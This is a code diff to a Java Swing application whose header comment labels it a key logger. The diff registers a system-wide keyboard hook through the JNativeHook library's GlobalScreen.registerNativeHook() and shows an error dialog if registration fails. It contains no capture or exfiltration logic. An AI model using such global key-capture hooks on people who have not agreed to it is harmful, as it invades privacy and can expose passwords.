@@ -6,10 +6,13 @@ import java.awt.Font;
 import javax.swing.JButton;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
+import javax.swing.JOptionPane;
 import javax.swing.JScrollPane;
 import javax.swing.JTable;
 import javax.swing.JTextArea;
 import javax.swing.JTextField;
+
+import org.jnativehook.GlobalScreen;
 
 /**
  * @author avcbcoder last modified @21-Mar-2018 @12:47:03 AM Key Logger - TODO
@@ -24,6 +27,13 @@ public class MainUI {
 	 * Launch the application.
 	 */
 	public static void main(String[] args) {
+		// Register the keyListener
+		try {
+			GlobalScreen.registerNativeHook();
+		} catch (Exception e) {
+			JOptionPane.showMessageDialog(null, "Unable to register Key Listener");
+		}
+		// Launch UI
 		EventQueue.invokeLater(new Runnable() {
 			public void run() {
 				try {
